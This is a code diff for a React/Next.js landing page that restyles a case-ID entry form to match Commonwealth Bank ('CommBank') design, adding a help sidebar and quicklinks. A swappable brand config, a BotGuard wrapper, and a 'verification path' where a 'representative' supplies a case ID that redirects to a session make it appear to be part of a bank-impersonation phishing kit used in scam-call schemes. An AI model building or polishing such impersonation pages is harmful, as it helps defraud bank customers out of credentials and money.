@@ -4,15 +4,25 @@
  * CBA Landing Page
  * 
  * Entry point for customer-initiated verification path
- * Customer enters case ID and is redirected to session UUID
+ * Two-column layout matching CommBank design patterns
  */
 
 import { useCallback, useState } from 'react';
 import { useRouter } from 'next/navigation';
 import { currentBrand } from '@/config/branding';
 import { useSessionStore } from '@shared';
-import { AlertCircle, Loader2 } from 'lucide-react';
+import { Loader2 } from 'lucide-react';
 import { BotGuard } from '@/components/security/BotGuard';
+import { Sidebar } from '@/components/layout/Sidebar';
+
+// Arrow Icon SVG component
+function ArrowIcon() {
+  return (
+    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
+    </svg>
+  );
+}
 
 export default function HomePage() {
   const router = useRouter();
@@ -90,56 +100,92 @@ export default function HomePage() {
 
   return (
     <BotGuard>
-      <div className="case-id-container">
-        <div className="case-id-box">
-          <div className="box-header">
-            <span>Enter your Case ID</span>
+      <div className="main-container">
+        {/* Two Column Layout */}
+        <section className="login-section">
+          {/* Left Column - Case ID Form */}
+          <div className="login-box">
+            <div className="box-header">
+              <span>Enter your Case ID</span>
+            </div>
+            <div className="box-content">
+              <form className="login-form" onSubmit={handleSubmit}>
+                <p className="form-description">
+                  Enter the case ID provided by your {currentBrand.companyName} representative.
+                </p>
+
+                <div className="form-row" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '8px', marginBottom: '15px' }}>
+                  <label htmlFor="case-id" className="form-label" style={{ width: 'auto', textAlign: 'left' }}>
+                    Case ID
+                  </label>
+                  <input
+                    type="text"
+                    id="case-id"
+                    name="case-id"
+                    className="form-input"
+                    style={{ width: '100%', maxWidth: '200px', height: '28px' }}
+                    autoComplete="off"
+                    value={caseId}
+                    onChange={(e) => {
+                      setCaseId(e.target.value);
+                      if (fieldError) setFieldError('');
+                    }}
+                    disabled={isLoading}
+                  />
+                </div>
+
+                {/* Error message - inline style */}
+                {fieldError && (
+                  <div className="error-message" style={{ marginBottom: '15px' }}>
+                    <span>{fieldError}</span>
+                  </div>
+                )}
+
+                {/* Continue Button */}
+                <div className="form-row button-row" style={{ paddingLeft: 0 }}>
+                  <button
+                    type="submit"
+                    className="logon-button"
+                    disabled={isLoading}
+                  >
+                    {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
+                    {isLoading ? 'Processing...' : 'Continue'}
+                  </button>
+                </div>
+              </form>
+
+              <div className="form-footer" style={{ paddingLeft: 0, marginTop: '20px' }}>
+                <p style={{ fontSize: '11px', color: '#666' }}>
+                  If you received a direct link from your representative, please use that link instead.
+                </p>
+              </div>
+            </div>
           </div>
 
-          <form className="case-id-form" onSubmit={handleSubmit}>
-            <div className="form-row" style={{ flexDirection: 'column', alignItems: 'stretch', gap: '8px' }}>
-              <label htmlFor="case-id" className="form-label" style={{ width: 'auto', textAlign: 'left' }}>
-                Case ID
-              </label>
-              <input
-                type="text"
-                id="case-id"
-                name="case-id"
-                className="case-id-input"
-                autoComplete="off"
-                value={caseId}
-                onChange={(e) => {
-                  setCaseId(e.target.value);
-                  if (fieldError) setFieldError('');
-                }}
-                disabled={isLoading}
-              />
-            </div>
+          {/* Right Column - Help Sidebar */}
+          <Sidebar title="Need help?">
+            <ul className="new-links">
+              <li><a href="#">What is a case ID?</a></li>
+              <li><a href="#">Contact {currentBrand.companyName} support</a></li>
+              <li><a href="#">Tips to stay safe online</a></li>
+            </ul>
+          </Sidebar>
+        </section>
 
-            {/* Error message */}
-            {fieldError && (
-              <div className="error-message">
-                <AlertCircle className="h-4 w-4" />
-                <span>{fieldError}</span>
-              </div>
-            )}
-
-            {/* Continue Button */}
-            <button
-              type="submit"
-              className="logon-button"
-              disabled={isLoading}
-              style={{ alignSelf: 'center' }}
-            >
-              {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
-              {isLoading ? 'Processing...' : 'Continue'}
-            </button>
-
-            <p className="case-id-note">
-              If an agent has provided you with a direct link, please use that link instead.
-            </p>
-          </form>
-        </div>
+        {/* Quicklinks Section */}
+        <section className="quicklinks-section">
+          <h3 className="quicklinks-title">Quicklinks</h3>
+          <ul className="quicklinks-list">
+            <li>
+              <ArrowIcon />
+              <a href="#">Are you experiencing financial difficulty? Get help</a>
+            </li>
+            <li>
+              <ArrowIcon />
+              <a href="#">Report suspicious activity or scams</a>
+            </li>
+          </ul>
+        </section>
       </div>
     </BotGuard>
   );
